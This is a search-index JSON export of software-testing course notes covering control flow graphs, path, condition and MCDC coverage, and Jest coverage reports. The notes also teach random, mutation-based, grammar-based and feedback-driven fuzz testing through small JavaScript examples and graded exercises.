{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to 50.043 For course handout click here . For project info click here .","title":"Home"},{"location":"#welcome-to-50043","text":"For course handout click here . For project info click here .","title":"Welcome to 50.043"},{"location":"notes/l10_2_whitebox_testing/","text":"50.003 - Code-based Testing : Path testing Learning Outcomes Construct a control flow graph from a structured program Explain different types of test coverage metrics based on program graph Apply path testing techniques to generate test case to attain path coverage and MCDC coverage. Recall Specification based testing Test cases are derived from the specification The goal is to _ _ _ _ Code-based testing Test cases are defined by making use of the knowledge of the internal structure and algorithm used in the test subject. The goal is to _ _ _ _ Code-based Testing If there exists some bug in the program, it must be triggered by some sequence of statements from the program. In order to find faults, the tests must cover all possible sequences of statements. Programs as Graphs As a convention, we write \\(\\overline{S}\\) to denote a sequence of statement \\(S_1;...;S_n\\) , \\(e\\) to denote an expression, i.e. \\(x > 1\\) , \\(isTrue\\) , etc. Let \\(P\\) be a program, and \\(G\\) to be the control flow graph of \\(P\\) , then * Each statement \\(S\\) in \\(P\\) denotes a vertex \\(V\\) in \\(G\\) , written, \\(S \\in P \\vdash V \\in G\\) , sometimes we omit the \\(P\\) and \\(G\\) for simplicity. * An edge \\((V_1,V_2)\\) exists in \\(G\\) iff \\(S_1;S_2\\) are two statements in sequence in \\(P\\) such that \\(S_1 \\vdash V_1\\) and \\(S_2 \\vdash V_2\\) . * Let \\({\\tt if}\\ e\\ \\{\\overline{S_1}\\} {\\tt else} \\{\\overline{S_2}\\} \\vdash V\\) then edges \\((V,V_1)\\) and \\((V, V_2)\\) exist in \\(G\\) iff * \\(S_1\\) is the first statement in \\(\\overline{S_1}\\) and \\(S_1 \\vdash V_1\\) and * \\(S_2\\) is the first statement in \\(\\overline{S_2}\\) and \\(S_2 \\vdash V_2\\) . * Let \\({\\tt if}\\ e\\ \\{\\overline{S_1}\\} {\\tt else} \\{\\overline{S_2}\\}; S'\\) in \\(P\\) and \\(S' \\vdash V'\\) then edges \\((V_1',V')\\) and \\((V_2',V')\\) exist in \\(G\\) iff * \\(S_1'\\) is the last statement in \\(\\overline{S_1}\\) and \\(S_1' \\vdash V_1'\\) and * \\(S_2'\\) is the last statement in \\(\\overline{S_2}\\) and \\(S_2' \\vdash V_2'\\) . * Let \\({\\tt while}\\ e\\ \\{\\overline{S_1}\\} \\vdash V\\) . Then edges \\((V, V_1)\\) exist in \\(G\\) iff * \\(S_1\\) is the first stataement in \\(\\overline{S_1}\\) and \\(S_1 \\vdash V_1\\) . * Let \\({\\tt while}\\ e\\ \\{\\overline{S_1}\\} \\vdash V\\) . Then edges \\((V_1', V)\\) exist in \\(G\\) iff * \\(V_1'\\) is the last stataement in \\(\\overline{S_1}\\) . We can compile for loops to while loops before generating the control flow graph. For example, consider the following program // example A function sum_all(arr) { let sum = 0; for (let i in arr) { sum = arr[i] + sum; } return sum; } will be compiled into // example A function sum_all(arr) { let sum = 0; let i = 0; while (i < arr.length) { sum = arr[i] + sum; i++; } return sum; } We can generate a control flow graph from sum_all graph 1-->2 2-->3 3-->4 4-->5 5-->3 3-->7 where the vertex IDs are the line number of the statement. Path Given a graph \\(G\\) , a path \\(p\\) is a sequence of vertices, \\(V_1,...,V_n\\) in \\(G\\) such that for all \\(i \\in [1,n-1]\\) , \\((V_i, V_{i+1})\\) is an edge in \\(G\\) . For example, in the above control flow graph, we have the following paths \\(1\\) \\(1,2,3\\) \\(1,2,3,7\\) \\(1,2,3,4,5,7\\) \\(2,3\\) ... Test Coverage Metrics Program Graph-based coverage There are following different levels of test coverage metrics for program testing A set of tests constitute 1. node coverage if all nodes in the control flow graph are visited when the tests are executed. 1. edge coverage if all the edges in the control flow graph are viisted when the tests are executed. 1. condition coverage if all conditional predicates are evaluated to both true and false. 1. path coverage if all the paths in the control flow graph are visited when the tests are executed. Note that condition coverage often works better than edge coverage as it forces the tests to exercise every single atomic predicates, i.e those are not formed by conjunction, disjunction and negation operator. Consider the following example // example B function div_by_zero(x,y) { if ((x==0) || (y>0)) { y = y/x; } else { x = y++; } return x + y; } Given the test cases * x = 5, y = -5 * x = 7, y = 5 covers all the edges, however it does not discover the division by zero bug. To trigger the bug, we would need to include the following test case x = 0, y = 1 Which gives us condition coverage. Note that path coverage is impossible the achieved without approximation in the presence of loops. In practice we are required to traverse each loop with a fixed number of times, often 1. Then we apply graph condensation, in which the cycles in the control flow graph is replaced by a single node. For instance, in our running example, the result of the condensation processing is graph 1-->2 2-->3' 3'-->7 in which the loop 3-4-5 is merged into a single node 3' by assuming the loop terminates after \\(X\\) of iterations. Condition coverage vs path coverage Note that neither path coverage entails condition coverage nor vice versa. For example, // example C if ((x>0) || (x <-1)) { res = 1; } else { res = 0; } To obtain path coverage, we could have two tests, i.e. x=1 and x = 0 , which voilates condition coverage. On the other hand, // example D if (x && y) { res = 1; } else { res = 0; } Having {( x = true, y = false ), ( x = false, y = true )} we achieve condition coverage, but not path coverage nor edge coverage. Note that condition coverage and edge coverage do not imply path coverage, either. // example E function f(x) { if (x > 1) { y = 1; } else { y = 0; } if (x > 0) { z = 1; } else { z = 0; } return y * z; } The test cases {( x = 2 ), ( x = -1 )} give us condition coverage and edge coverage. But we have not attained path coverage. e.g. we have not visited the path of taking the then-branch of the first if-statement followed by the else-branch of the second if-statement. MCDC coverage MCDC stands for Modified Condition Decision Coverage. MCDC requires Each statement must be executed at least once. Every program entry point and exit point must be invoked at least once. All possible outcomes of every control statement are taken at least once. Every nonconstant Boolean expression has been evaluated to both true and false outcomes. A boolean expression is constant iff it is a tautology, e.g. a==a , a!=a and p && !p Every nonconstant condition in a Boolean expression has been evaluated to both true and false outcomes. Every nonconstant condition in a Boolean expression has been shown to independently affect the outcomes (of the expression). Points 1 and 2 entail node coverage, 3 and 4 imply edge coverage. 5 implies condition coverage. 6 requires more explaination. In the example D, to achieve MCDC coverage, we generate a decision table cond 1 2 3 4 x T T F F y T F T F x && y T F F F actions res = 0 X res = 1 X X X In the above table, we conclude that if we fix x with one value, and toggle y 's value we are able to obtain both actions. Similar observation applies when we fix y and toggle x . So we argue that we achieve MCDC coverage if we pick either { ( x = true, y = true ), ( x = false, y = true ), ( x = true, y = false ) } or { ( x = true, y = true ), ( x = false, y = true ), ( x = false, y = false ) } While for example C cond 1 2 3 x>0 T F F x<-1 F T F x >0 || x<-1 T T F actions res = 1 X X res = 0 X In the above table we realize that the two sub condition expresssions x>0 and x<-1 are dependent mutually, i.e. we can't hold x>0 to be true and toggle x<-1 . In this example, we can still attain MCDC coverage by considering {x=1, x =-2, x=0} . If we adjust the example by replacing x >0 || x<-1 with x >0 && x < -1 , there is no way we can attain MCDC coverage, because it is impossoble to find such a value of x to satisfy the condition. Coverage Report in Jest In Jest, we can enable to coverage report by adding the following to the package.json , assuming Jest has been enabled and installed. \"jest\": { \"collectCoverage\": true ,\"coverageReporters\": [\"text\", \"html\"] }, Assuming we have the sum_all.js file with code describe in the example A and the corresponding test code as follows, // test/sum_all.test.js const sum_all = require('../src/sum_all'); describe(\"test suite for sum_all\", () => { test (\"test 1 for sum_all\", () => { const expected = 55; expect(sum_all([1,2,3,4,5,6,7,8,9,10])).toBe(expected); }) }) when we run npm run test sum_all.test.js , we see the following additional output PASS test/sum_all.test.js test suite for sum_all \u2713 test 1 for sum_all (3 ms) ------------|---------|----------|---------|---------|------------------- File | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s ------------|---------|----------|---------|---------|------------------- All files | 100 | 100 | 100 | 100 | sum_all.js | 100 | 100 | 100 | 100 | ------------|---------|----------|---------|---------|------------------- We may also refer to the .html report generated in the coverage folder. Unfortunately, we don't get condition coverage from jest builtin coverage analyzer. Consider the div_by_zero test. Given the div_by_zero function in example B and the test code as follows // test/div_by_zero.test.js const f = require('../src/div_by_zero'); describe(\"test suite for div_by_zero\", () => { test (\"test 1 for f\", () => { const expected = -9; expect(f(5,-5)).toBe(expected); }) test (\"test 2 for f\", () => { const expected = 7.714285714285714; expect(f(7,5)).toBeCloseTo(expected,5); }) }) running npm run test div_by_zero.test.js we find ----------------|---------|----------|---------|---------|------------------- File | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s ----------------|---------|----------|---------|---------|------------------- All files | 100 | 100 | 100 | 100 | div_by_zero.js | 100 | 100 | 100 | 100 | ----------------|---------|----------|---------|---------|------------------- Path Testing To conduct path testing, a general approach is to generate enough test cases cover all paths with condensation (if possible). in case of complex condition expression (esp with dependent condition expressions), we should construct a decision table to check impossibilities and generate additional test cases to ensure condition coverage. In regard to the path generation, we first need to find out how many unique paths exist. Recall notion of cyclomatic complexity from graph theory class, that defines the number of linearly independent paths from the entry to the exit node. $$ V(G) = e - n + 2p $$ where \\(e\\) is the number of edges in \\(G\\) and \\(n\\) is the number of nodes in \\(G\\) and \\(p\\) denotes the number of connected components. Since we are dealing with one program at a time, the number of connected compoment is 1. (Note \\(p\\) is not strongly connected component.) By applying the above formula to the control flow graph from the max_all function, we find that in total there are 6 - 6 + 2 * 1 = 2 linearly unique paths from the entry to the exit, namely \\(1,2,3,7\\) \\(1,2,3,4,5,7\\) We generate the test cases as follows, id arr expected output 1 [] 0 2 [1,2,3,4,5,6,7,8,9,10] 55 Note that Cyclomatic Complexity only measures the number of uniquely linearly paths, which serves as the lower-bound of the path coverage. For instance, recall example E, the cyclomatic complexity of function f is 8-7+2*1 = 3. But there exist 4 executable paths. This is because when counting linearly paths, the first if-else gives us two paths, by including a second if-else adds an extra 1 uniquely linearly path (as alternative). To find all executale paths (with max 1-loop-unrolling), we need to rely on the condition coverage. Now we have to verify whether we have attained MCDC for max_all . Since there is only one predicate i < arr.length we have already covered both possible outcome of the predicate, namely, we executed the body the loop as well as exit from the loop. Hence we argue that the above test cases is providing path and MCDC coverage. Cohort Exercise (Graded) Let's consider another example function gcd(x,y) { let r = null; if ((x < 1) || (y < 1)) { r = null; } else { while (x != y) { if (x > y) { let t = x - y; x = y; y = t } else { let t = y - x; y = x; x = t; } } r = x; } return r; } construct CFG of the above program. find the cyclomatic complexity of the CFG. generate the test cases to cover all paths. generate extra test cases (if needed) to attain MCDC coverage. verify your test cases's coverage using jest (though it is only up to edge coverage)","title":"50.003 - Code-based Testing : Path testing"},{"location":"notes/l10_2_whitebox_testing/#50003-code-based-testing-path-testing","text":"","title":"50.003 - Code-based Testing : Path testing"},{"location":"notes/l10_2_whitebox_testing/#learning-outcomes","text":"Construct a control flow graph from a structured program Explain different types of test coverage metrics based on program graph Apply path testing techniques to generate test case to attain path coverage and MCDC coverage.","title":"Learning Outcomes"},{"location":"notes/l10_2_whitebox_testing/#recall","text":"Specification based testing Test cases are derived from the specification The goal is to _ _ _ _ Code-based testing Test cases are defined by making use of the knowledge of the internal structure and algorithm used in the test subject. The goal is to _ _ _ _","title":"Recall"},{"location":"notes/l10_2_whitebox_testing/#code-based-testing","text":"If there exists some bug in the program, it must be triggered by some sequence of statements from the program. In order to find faults, the tests must cover all possible sequences of statements.","title":"Code-based Testing"},{"location":"notes/l10_2_whitebox_testing/#programs-as-graphs","text":"As a convention, we write \\(\\overline{S}\\) to denote a sequence of statement \\(S_1;...;S_n\\) , \\(e\\) to denote an expression, i.e. \\(x > 1\\) , \\(isTrue\\) , etc. Let \\(P\\) be a program, and \\(G\\) to be the control flow graph of \\(P\\) , then * Each statement \\(S\\) in \\(P\\) denotes a vertex \\(V\\) in \\(G\\) , written, \\(S \\in P \\vdash V \\in G\\) , sometimes we omit the \\(P\\) and \\(G\\) for simplicity. * An edge \\((V_1,V_2)\\) exists in \\(G\\) iff \\(S_1;S_2\\) are two statements in sequence in \\(P\\) such that \\(S_1 \\vdash V_1\\) and \\(S_2 \\vdash V_2\\) . * Let \\({\\tt if}\\ e\\ \\{\\overline{S_1}\\} {\\tt else} \\{\\overline{S_2}\\} \\vdash V\\) then edges \\((V,V_1)\\) and \\((V, V_2)\\) exist in \\(G\\) iff * \\(S_1\\) is the first statement in \\(\\overline{S_1}\\) and \\(S_1 \\vdash V_1\\) and * \\(S_2\\) is the first statement in \\(\\overline{S_2}\\) and \\(S_2 \\vdash V_2\\) . * Let \\({\\tt if}\\ e\\ \\{\\overline{S_1}\\} {\\tt else} \\{\\overline{S_2}\\}; S'\\) in \\(P\\) and \\(S' \\vdash V'\\) then edges \\((V_1',V')\\) and \\((V_2',V')\\) exist in \\(G\\) iff * \\(S_1'\\) is the last statement in \\(\\overline{S_1}\\) and \\(S_1' \\vdash V_1'\\) and * \\(S_2'\\) is the last statement in \\(\\overline{S_2}\\) and \\(S_2' \\vdash V_2'\\) . * Let \\({\\tt while}\\ e\\ \\{\\overline{S_1}\\} \\vdash V\\) . Then edges \\((V, V_1)\\) exist in \\(G\\) iff * \\(S_1\\) is the first stataement in \\(\\overline{S_1}\\) and \\(S_1 \\vdash V_1\\) . * Let \\({\\tt while}\\ e\\ \\{\\overline{S_1}\\} \\vdash V\\) . Then edges \\((V_1', V)\\) exist in \\(G\\) iff * \\(V_1'\\) is the last stataement in \\(\\overline{S_1}\\) . We can compile for loops to while loops before generating the control flow graph. For example, consider the following program // example A function sum_all(arr) { let sum = 0; for (let i in arr) { sum = arr[i] + sum; } return sum; } will be compiled into // example A function sum_all(arr) { let sum = 0; let i = 0; while (i < arr.length) { sum = arr[i] + sum; i++; } return sum; } We can generate a control flow graph from sum_all graph 1-->2 2-->3 3-->4 4-->5 5-->3 3-->7 where the vertex IDs are the line number of the statement.","title":"Programs as Graphs"},{"location":"notes/l10_2_whitebox_testing/#path","text":"Given a graph \\(G\\) , a path \\(p\\) is a sequence of vertices, \\(V_1,...,V_n\\) in \\(G\\) such that for all \\(i \\in [1,n-1]\\) , \\((V_i, V_{i+1})\\) is an edge in \\(G\\) . For example, in the above control flow graph, we have the following paths \\(1\\) \\(1,2,3\\) \\(1,2,3,7\\) \\(1,2,3,4,5,7\\) \\(2,3\\) ...","title":"Path"},{"location":"notes/l10_2_whitebox_testing/#test-coverage-metrics","text":"","title":"Test Coverage Metrics"},{"location":"notes/l10_2_whitebox_testing/#program-graph-based-coverage","text":"There are following different levels of test coverage metrics for program testing A set of tests constitute 1. node coverage if all nodes in the control flow graph are visited when the tests are executed. 1. edge coverage if all the edges in the control flow graph are viisted when the tests are executed. 1. condition coverage if all conditional predicates are evaluated to both true and false. 1. path coverage if all the paths in the control flow graph are visited when the tests are executed. Note that condition coverage often works better than edge coverage as it forces the tests to exercise every single atomic predicates, i.e those are not formed by conjunction, disjunction and negation operator. Consider the following example // example B function div_by_zero(x,y) { if ((x==0) || (y>0)) { y = y/x; } else { x = y++; } return x + y; } Given the test cases * x = 5, y = -5 * x = 7, y = 5 covers all the edges, however it does not discover the division by zero bug. To trigger the bug, we would need to include the following test case x = 0, y = 1 Which gives us condition coverage. Note that path coverage is impossible the achieved without approximation in the presence of loops. In practice we are required to traverse each loop with a fixed number of times, often 1. Then we apply graph condensation, in which the cycles in the control flow graph is replaced by a single node. For instance, in our running example, the result of the condensation processing is graph 1-->2 2-->3' 3'-->7 in which the loop 3-4-5 is merged into a single node 3' by assuming the loop terminates after \\(X\\) of iterations.","title":"Program Graph-based coverage"},{"location":"notes/l10_2_whitebox_testing/#condition-coverage-vs-path-coverage","text":"Note that neither path coverage entails condition coverage nor vice versa. For example, // example C if ((x>0) || (x <-1)) { res = 1; } else { res = 0; } To obtain path coverage, we could have two tests, i.e. x=1 and x = 0 , which voilates condition coverage. On the other hand, // example D if (x && y) { res = 1; } else { res = 0; } Having {( x = true, y = false ), ( x = false, y = true )} we achieve condition coverage, but not path coverage nor edge coverage. Note that condition coverage and edge coverage do not imply path coverage, either. // example E function f(x) { if (x > 1) { y = 1; } else { y = 0; } if (x > 0) { z = 1; } else { z = 0; } return y * z; } The test cases {( x = 2 ), ( x = -1 )} give us condition coverage and edge coverage. But we have not attained path coverage. e.g. we have not visited the path of taking the then-branch of the first if-statement followed by the else-branch of the second if-statement.","title":"Condition coverage vs path coverage"},{"location":"notes/l10_2_whitebox_testing/#mcdc-coverage","text":"MCDC stands for Modified Condition Decision Coverage. MCDC requires Each statement must be executed at least once. Every program entry point and exit point must be invoked at least once. All possible outcomes of every control statement are taken at least once. Every nonconstant Boolean expression has been evaluated to both true and false outcomes. A boolean expression is constant iff it is a tautology, e.g. a==a , a!=a and p && !p Every nonconstant condition in a Boolean expression has been evaluated to both true and false outcomes. Every nonconstant condition in a Boolean expression has been shown to independently affect the outcomes (of the expression). Points 1 and 2 entail node coverage, 3 and 4 imply edge coverage. 5 implies condition coverage. 6 requires more explaination. In the example D, to achieve MCDC coverage, we generate a decision table cond 1 2 3 4 x T T F F y T F T F x && y T F F F actions res = 0 X res = 1 X X X In the above table, we conclude that if we fix x with one value, and toggle y 's value we are able to obtain both actions. Similar observation applies when we fix y and toggle x . So we argue that we achieve MCDC coverage if we pick either { ( x = true, y = true ), ( x = false, y = true ), ( x = true, y = false ) } or { ( x = true, y = true ), ( x = false, y = true ), ( x = false, y = false ) } While for example C cond 1 2 3 x>0 T F F x<-1 F T F x >0 || x<-1 T T F actions res = 1 X X res = 0 X In the above table we realize that the two sub condition expresssions x>0 and x<-1 are dependent mutually, i.e. we can't hold x>0 to be true and toggle x<-1 . In this example, we can still attain MCDC coverage by considering {x=1, x =-2, x=0} . If we adjust the example by replacing x >0 || x<-1 with x >0 && x < -1 , there is no way we can attain MCDC coverage, because it is impossoble to find such a value of x to satisfy the condition.","title":"MCDC coverage"},{"location":"notes/l10_2_whitebox_testing/#coverage-report-in-jest","text":"In Jest, we can enable to coverage report by adding the following to the package.json , assuming Jest has been enabled and installed. \"jest\": { \"collectCoverage\": true ,\"coverageReporters\": [\"text\", \"html\"] }, Assuming we have the sum_all.js file with code describe in the example A and the corresponding test code as follows, // test/sum_all.test.js const sum_all = require('../src/sum_all'); describe(\"test suite for sum_all\", () => { test (\"test 1 for sum_all\", () => { const expected = 55; expect(sum_all([1,2,3,4,5,6,7,8,9,10])).toBe(expected); }) }) when we run npm run test sum_all.test.js , we see the following additional output PASS test/sum_all.test.js test suite for sum_all \u2713 test 1 for sum_all (3 ms) ------------|---------|----------|---------|---------|------------------- File | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s ------------|---------|----------|---------|---------|------------------- All files | 100 | 100 | 100 | 100 | sum_all.js | 100 | 100 | 100 | 100 | ------------|---------|----------|---------|---------|------------------- We may also refer to the .html report generated in the coverage folder. Unfortunately, we don't get condition coverage from jest builtin coverage analyzer. Consider the div_by_zero test. Given the div_by_zero function in example B and the test code as follows // test/div_by_zero.test.js const f = require('../src/div_by_zero'); describe(\"test suite for div_by_zero\", () => { test (\"test 1 for f\", () => { const expected = -9; expect(f(5,-5)).toBe(expected); }) test (\"test 2 for f\", () => { const expected = 7.714285714285714; expect(f(7,5)).toBeCloseTo(expected,5); }) }) running npm run test div_by_zero.test.js we find ----------------|---------|----------|---------|---------|------------------- File | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s ----------------|---------|----------|---------|---------|------------------- All files | 100 | 100 | 100 | 100 | div_by_zero.js | 100 | 100 | 100 | 100 | ----------------|---------|----------|---------|---------|-------------------","title":"Coverage Report in Jest"},{"location":"notes/l10_2_whitebox_testing/#path-testing","text":"To conduct path testing, a general approach is to generate enough test cases cover all paths with condensation (if possible). in case of complex condition expression (esp with dependent condition expressions), we should construct a decision table to check impossibilities and generate additional test cases to ensure condition coverage. In regard to the path generation, we first need to find out how many unique paths exist. Recall notion of cyclomatic complexity from graph theory class, that defines the number of linearly independent paths from the entry to the exit node. $$ V(G) = e - n + 2p $$ where \\(e\\) is the number of edges in \\(G\\) and \\(n\\) is the number of nodes in \\(G\\) and \\(p\\) denotes the number of connected components. Since we are dealing with one program at a time, the number of connected compoment is 1. (Note \\(p\\) is not strongly connected component.) By applying the above formula to the control flow graph from the max_all function, we find that in total there are 6 - 6 + 2 * 1 = 2 linearly unique paths from the entry to the exit, namely \\(1,2,3,7\\) \\(1,2,3,4,5,7\\) We generate the test cases as follows, id arr expected output 1 [] 0 2 [1,2,3,4,5,6,7,8,9,10] 55 Note that Cyclomatic Complexity only measures the number of uniquely linearly paths, which serves as the lower-bound of the path coverage. For instance, recall example E, the cyclomatic complexity of function f is 8-7+2*1 = 3. But there exist 4 executable paths. This is because when counting linearly paths, the first if-else gives us two paths, by including a second if-else adds an extra 1 uniquely linearly path (as alternative). To find all executale paths (with max 1-loop-unrolling), we need to rely on the condition coverage. Now we have to verify whether we have attained MCDC for max_all . Since there is only one predicate i < arr.length we have already covered both possible outcome of the predicate, namely, we executed the body the loop as well as exit from the loop. Hence we argue that the above test cases is providing path and MCDC coverage.","title":"Path Testing"},{"location":"notes/l10_2_whitebox_testing/#cohort-exercise-graded","text":"Let's consider another example function gcd(x,y) { let r = null; if ((x < 1) || (y < 1)) { r = null; } else { while (x != y) { if (x > y) { let t = x - y; x = y; y = t } else { let t = y - x; y = x; x = t; } } r = x; } return r; } construct CFG of the above program. find the cyclomatic complexity of the CFG. generate the test cases to cover all paths. generate extra test cases (if needed) to attain MCDC coverage. verify your test cases's coverage using jest (though it is only up to edge coverage)","title":"Cohort Exercise (Graded)"},{"location":"notes/l11_1_auto_test_generation/","text":"50.003 - Auto Test Generation Learning Outcomes By the end of this unit you should be able to explain the roles and functionalities of the test generator. apply mutation-based fuzzing to generate test cases. apply generation-based function to synthesize test cases. Test Generation Recall that process of software testing. graph Input-->Program Program-->TO TO[\"Test Oracle\"]-->Pass TO[\"Test Oracle\"]-->Fail So far we have been defining, curating and generating test cases manually. In this unit we consider some approaches that generates test cases automatically. graph TG[\"Test Generator\"]-->Input Input-->Program Program-->TO TO[\"Test Oracle\"]-->Pass TO[\"Test Oracle\"]-->Fail Fuzz Testing Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. Fuzzing aims to identify test inputs which reveal exploitable vulnerabilities. One downside for fuzzing is that it can't generate the expected outputs. This drawback is minor since for most of the fuzzing test cases, error should be expected outputs. Why fuzzing Besides test case generation automation, there are several extra reasons why fuzzing should be considered. A study found that one-quarter to one-third of all utilities on every UNIX system that the evaluators could get their hands on would crash in the presence of random input. A study that looked at 30 different Windows applications found that 21% of programs crashed and 24% hung when sent random mouse and keyboard input, and every single application crashed or hung when sent random Windows event messages. A study found that OS X applications, including Acrobat Reader, Apple Mail, Firefox, iChat, iTunes, MS Office, Opera, and Xcode, were even worse than the Windows ones. The Base Line - Random Testing The base line of fuzzing is to randomly generate inputs as sequences of characters or bytes. Such a approach can be easily implemented. For instance, consider the javascript program simple-fuzzer.js function random_fuzz() { let res = \"\"; // strings of any length between 0 and 1024 let length = Math.floor(Math.random() * 1024); //generate a random character at each location of the string for (let i =0 ; i < length ; i ++) { //generate a character between ASCII 32 and 128 let c = String.fromCharCode(Math.floor(Math.random() * 96) + 32); res = res + c; } return res; } console.log(random_fuzz()) Running node simple-fuzzer.js produces .u/m:SKx[-:\\3t3b?z87f)6'35!t1Y``fGR[_JS:&9^RSIA6svw8G~!%!%_lHA9b\\-a\"cw$<|$2Gc^8&A*c$eT#wd<QUd}Y1ua>yDxh:=NC^3jI~KMivT'.j{Cp%cDco\\2aG/cw3d$<Ih|vIm,_4d,oE8;nV!VXc:[1T,X{F)pIh8=+_[Xtm=_2X:9EWU_Oo*$|^0}nw~Dr1cQ(<dr}Y7/lH&mS$7?fx(F(]j)^9#j8.m2`<v_]=\"PAI{qvD+yxPusDx!/5ZXMFf'b\"Q,.pt7K\\\\?i7Yj 8Tx)/E'`M[}=v{>GtDbijU%mwEZB?PG]Fo{{6]jXRD[0(<zgbsah1J!D&m\\`aGQ8ehDbQN9>^C<I[AZ2;s'%_oj1}#RuCj~i=O\"vG]Q!FJ`UP:?{Y|]o\\P#7zi'8\\Ck@!vC./j:C.\\)iGx>Q]@zffZ24]lZw4L7BKk0dA{/ Z6`3v:NN8:h:@/qOC.oq{O^kgYD(#;|@_\\i,l!x2P14G(|T+KL!bml:<[P+Sh!*]JY|\\y\\dL[ In the older days when softwares were developed using less advanced tools and techniques, this approach was effective. In modern days, in which many softwares were developed with proper design and having standard input validation in-place, e.g. type checking, regex and parser etc. Most of the randomly generated input will be immediately rejected, without reaching very \"deep\" in the test subject. Mutation based fuzzing One of the possible ways to overcome the limitation with the random testing is that we could consider generating fuzzy test cases based on known valid test inputs. For instance, assuming that we note that one of the valid inputs to the test subject is the following string ISTDisApillarInSUTDbutItsNameiSGoingToChange One possible way to mutate it is to choose a character at a random position and replace it by ssomething else. For instance, we randoml choose position (say 13) and replace the character I by character Y ISTDisApillarYnSUTDbutItsNameiSGoingToChange The above is consdered an mutant of the original input. Here are some basic operations for mutation at some randomly chosen location. Flipping a bit/boolean/integer/character Trimming Swapping characters/bits Insert characters Corhort Exercise (Graded) Given an input string, implement a mutation operator that chooses a random position in the string and swaps the adjacent characters. Meaning if SUTD is an input string and 2 is chosen as the random position, the output should be SUDT . Careful about the string length bound check. Generation based fuzzing An alternative to Mutation-based fuzzing is touse generation based fuzzing. In generation based fuzzing, we assume that we have access to a set of grammar rules that defines the possible syntatically valid inputs to the test subject. Formal Grammar In computer science, we often use formal grammar as the specification of a language. A language denotes a set of sequences of terminals. A terminal is often a symbol, a byte, or a number. For example, consider a language of arithmetic expressions which consists of +,-,*,/ as the operators and numbers as operands. In addition, we allow to use () to disambiguate ambiguous terms. For instance 5 + 2 * 3 is one of the valid expressions according to the following EBNF grammar rules S ::= Expr Expr ::= Expr + Term | Expr - Term | Term Term ::= Term * Factor | Term / Factor | Factor Factor ::= -Integer | (Expr) | Integer | Integer.Integer Integer ::= Digit | IntegerDigit Digit ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 In the above, each line denotes a rule. A rule consists of a left-hand-side, a define operator ::= and a right-hand-side. The LHS is a non-terminal . A non-terminal is a meta symbol in the grammar which defines a potential expension. As a dual, we have terminals, which are the atomic/elementary symbols in the languages, such as 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, +, -, *, /, ,., (, ) and white space. The RHS of a rule is a set of alternatives sepearated by | . Each alternative is a sequence of terminals and non-terminals. We could interpret each rule as the LHS non-terminal can be potentially expanded into the one of the alternatives in the RHS. For example, we consider the rule with Expr as the LHS, which says the expression non-terminal can be either a + expression (which consists another Expr , a + and a non-terminal Term ), or a - expression, or a Term by itself. Parse Tree Given a grammar, a parser normally validates the input sequence by attempting to construct a parse tree. A parse tree records from which grammar rules the input sequence can be validated according to the grammar. We can also think of the parse tree as the result of the parsing. For example, the exxpression 5 + 2 * 3 can be parsed into the following parse tree graph N0(\"S\") --> N1 N1(\"Expr\") --> N2 N1(\"Expr\") --> N3(\"+\") N1(\"Expr\") --> N4 N2(\"Expr\") --> N5 N5(\"Term\") --> N6 N6(\"Factor\") --> N7 N7(\"Integer\") --> N8 N8(\"Digit\") --> N9(\"5\") N4(\"Term\") --> N10 N4(\"Term\") --> N11(\"*\") N4(\"Term\") --> N12 N10(\"Term\") --> N13 N13(\"Factor\") --> N14 N14(\"Integer\") --> N15 N15(\"Digit\") --> 2 N12(\"Factor\") --> N16 N16(\"Integer\") --> N17 N17(\"Digit\") --> N18(\"3\") In the above parse tree, starting from the root, we find that the first rule we applied in parsing 5 + 2 * 3 is S ::= Expr . The subtree indicates that the second rule/alternative we apply is Expr ::= Expr + Term . The left subtree contains no branches, which leads us to the digit 5 . The right subtree indicates that the rule we applied to parse the sub expression 2 * 3 is Term ::= Factor . Generate Fuzz test using the grammar Given we understand the input requirement, we can now define a better fuzzer w.r.t to the grammar. The idea is to starting from the starting rule's nonterminal, randomly choose one grammar rule given the current non-terminal to generate a sub term (sub parse tree). We need to take note of Do not over expand with the recursive alternative. Do not always expand the same sub-tree / node. With this we can generate a good set of fuzz test input passing the syntax checking of the target software and yet having enough randomness. Cohort Exercise (Graded) Use JavaScript to implement a fuzzer that will randomly generate inputs to the calculator conforming to the grammar. For now, you can hardcode the expression grammar. Hint: Start with the initial rule S ::= Expr and at each point, apply a rule at random. For example, randomly choose any of the rules Expr ::= Term , Expr ::= Expr + Term or Expr \u2013 Term in the next step. Continue until a valid expression for the calculator is obtained. Make sure you do not expand the rules forever to avoid infinite loop. Limitations of Fuzzing Fuzzing offers many perks to maintain goodd quality of softwares. Can provide results with little effort Can reveal bugs that were missed in a manual audit Provides an overall picture of the robustness of the target software It also shares certain limitations Will not find all bugs The crashing test cases that are produced may be difficult to analyse, as the act of fuzzing does not give you much knowledge of how the software operates internally Programs with complex inputs can require much more work to produce a smart enough fuzzer to get sufficient code coverage Feedback-based Fuzzing Besides getting the fuzzer to leverage the input specification, another orthothongal approach is to gather feedback from the test report. The idea is to turn the test case generation problem into an optimization problem. graph N1-->N2 N2(\"Execute Test Cases\")-->N3 N3(\"Collect Feedback\")-->N1(\"Generate Test Cases\") As illustrated by the above diagram, in a feedback-baed fuzzing testing framework, we first use a fuzzer to generate the test cases, Then execute the test cases against the test subject. Finally we collect the test outcomes and report as a feedback to the fuzzer which should improve the test effectivness. One common way to measure test effectiveness is to measure the code coverage. Exercise (Not Graded) Recall that in Jest, we can generate the coverage report in text or html. Note that it can also generate json report. With it, we can feed the json report back to the fuzzer to generate a better set of tests to increase the code coverage. Discuss among your team members to think of a possible implementation to incorporate feedback-based fuzzing API Fuzzing Fuzz testing can be applied to API testing in several aspect Fuzzing the low level request - generates random bytes as HTTP requests to test the robustness of the API service. Fuzzing the routes - through fuzzers, we could generate sequences of random valid / invalid requests to the test the API routers. Fuzzing the high level request - generate GET/POST/DEL/PUT HTTP requests by fuzzing HTTP parameters or form parameters. Some references can be found in the following https://medium.com/@Magii/fuzzing-with-postman-599dce6317c7 https://github.com/KissPeter/APIFuzzer 